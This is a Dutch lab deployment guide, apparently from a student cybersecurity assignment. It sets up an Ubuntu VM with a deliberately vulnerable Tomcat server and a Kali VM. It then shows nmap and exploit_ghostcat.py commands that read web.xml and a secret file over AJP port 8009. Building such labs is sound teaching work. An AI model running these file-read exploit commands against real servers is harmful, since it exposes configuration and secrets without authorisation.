# Uitrol

## Doel en overzicht: Beschrijft de software of het systeem dat wordt geïmplementeerd. Doelen van de deployment (bijv. nieuwe versie, bugfixes, etc.).

## Systeemvereisten: Hardware- en softwarevereisten (bijv. besturingssysteem, geheugen, schijfruimte, etc.). Externe afhankelijkheden (bijv. andere software, netwerkinstellingen, databases).

Voor te installeren hebben we twee scripts voorzien

1. init.ps1; deze werkt enkel op Windows + voor als u de vdi's al op uw computer heeft staan: u moet zelf vdi's in de desbetreffende pad zetten namelijk:
   - \user\ [naam_gebruiker]\Downloads\64bit\64bit\ [vdi]) voor eerste vdi
   - \user\ [naam_gebruiker]\Downloads\64bit (1)\64bit\ [vdi] voor tweede vdi
2. 2init.ps1; deze werkt zowel op Windows als Linux + dit is een complete automatisatie: u hoeft niets te doen (vdi's worden van uit het internet afgehaald en geplaatst in het correcte pad)

In deze installatie wordt er gebruik gemaakt van

- Ubuntu 24.10 (64bit) vdi en
- Kali Linux 2024.3 (64bit) vdi

**Opgelet**: Zorg ervoor dat deze vdi's niet reeds op uw computer staan om conflicten te vermijden. 

Voor alles te deinstalleren voert u het script nog een keer uit in de terminal, er wordt om bevestiging gevraagd.

...

## Installatie-instructies: Stap-voor-stap instructies voor het installeren van de software. Waar de bestanden te vinden zijn (bijv. downloadlink, locatie van installatiebestanden). Vereiste rechten voor installatie (bijv. beheerdersrechten).

- Ubuntu 24.10 (64bit) vdi -> 
- Kali Linux 2024.3 (64bit) vdi -> https://sourceforge.net/projects/osboxes/files/v/vb/25-Kl-l-x/2024.3/64bit.7z/download

## Configuratie-instellingen: Configuratie-instellingen die mogelijk moeten worden aangepast om de software goed te laten functioneren. Aanpassingen aan netwerkconfiguraties, databases, services, of beveiligingsinstellingen.

- Ubuntu VM ->

- Kali VM ->

## Testen: Richtlijnen voor het testen van de geïnstalleerde software om ervoor te zorgen dat deze werkt zoals verwacht. Eventuele testscenario’s of validatie van functionaliteit.

Nu dat de virtuele machines correct geinstalleerd staan, gaan we beginnen met deze op te starten.

START DE UBUNTU VM
1) Het wachtwoord is osboxes.org
2) (indien je wil kan je de instellingen verander voor het toetsenbord zodat het makkelijker is om de commando's uit te voeren)
      2.1) ga naar instellingen -> toetsenbord -> 
3) open de terminal en voer de volgende commando's uit
4) sudo apt install openssh-server -y
5) sudo systemctl start ssh
6) sudo systemctl enable ssh
7) mkdir ghostcat
8) ip a

(kijk welk ip adres de ubuntu vm heeft)
(De 2 bestanden kopieren naar Ubuntu (gebruik jouw eigen pad en ip van de vms))

10) scp C:/Users/[gebruiker]/cyber-npe-opdracht/scripts/bash/setup_tomcat.sh osboxes@[ip adres van de ubuntu vm]:~/ghostcat/setup_tomcat.sh
11) scp C:/Users/[gebruiker]/cyber-npe-opdracht/scripts/dockerfile/Dockerfile osboxes@[ip adres van de ubuntu vm]:~/ghostcat/Dockerfile
12) chmod +x  setup_tomcat.sh
13) ./setup_tomcat.sh
    
(het ip adres van de ubuntu vm)

15) curl http://[ip adres van de ubuntu vm]:8080/

START DE KALI VM
1) Het wachtwoord is osboxes.org
2) (indien je wil kan je de instellingen verander voor het toetsenbord zodat het makkelijker is om de commando's uit te voeren)
      2.1) ga naar instellingen -> toetsenbord -> 

3) sudo systemctl start ssh
4) sudo systemctl enable ssh
5) ip a

(kijk welk ip adres de ubuntu vm heeft)
(gebruik jouw eigen pad en ip van de vms)

6) scp C:/Users/[gebruiker]/cyber-npe-opdracht/scripts/python/exploit_ghostcat.py osboxes@[ip adres van de kali vm]:~/exploit_ghostcat.py
7) chmod +x exploit_ghostcat.py
8) nmap [ip adres van de ubuntu vm] -p 8009

(Voer de exploit uit:)

9) python3 exploit_ghostcat.py http://[ip adres van de ubuntu vm]:8080/ 8009 /WEB-INF/web.xml read
10) python3 exploit_ghostcat.py http://[ip adres van de ubuntu vm]:8080/ 8009 /WEB-INF/secret.txt read

## Rollback-plan: Instructies voor wat te doen als er iets misgaat tijdens de implementatie (bijv. hoe je terug kunt keren naar de vorige versie). Back-upprocedures.

## Ondersteuning en foutoplossing: Veelvoorkomende problemen en oplossingen. Contactinformatie voor technische ondersteuning.

indien er een probleem zou zijn met het ip adres kan je deze zelf aanpassen zodat je zeker bent welk ip adres je hebt via volgende stappen:

in ubuntu:
   1) ga naar het netwerkicoon
   2) open de netwerkinstellingen
   3) selecteer Wired
   4) selecteer bewerken
   5) ga naar IPv4
   6) selecteer handmatig
   7) kies nu een ip adress die je aan de kali vm wil geven (voorbeeld: 192.168.56.115)
   8) stel de subnetmask in met 255.255.255.0
   9) stel de DNS-server in met 8.8.8.8
       
in kali:
   1) ga naar het netwerkicoon
   2) open de netwerkinstellingen
   3) selecteer Wired Connection 1
   4) selecteer bewerken
   5) ga naar IPv4
   6) selecteer handmatig
   7) kies nu een ip adress die je aan de kali vm wil geven (voorbeeld: 192.168.56.116)
   8) stel de subnetmask in met 255.255.255.0
   9) stel de DNS-server in met 8.8.8.8 
## Versiebeheer: Versie-informatie van de geïmplementeerde software. Veranderingen of nieuwe functies in de versie die wordt gedeployed.

## Schaling en onderhoud: Hoe het systeem kan worden opgeschaald of uitgebreid. Instructies voor regelmatige onderhoudstaken of updates na de deployment.
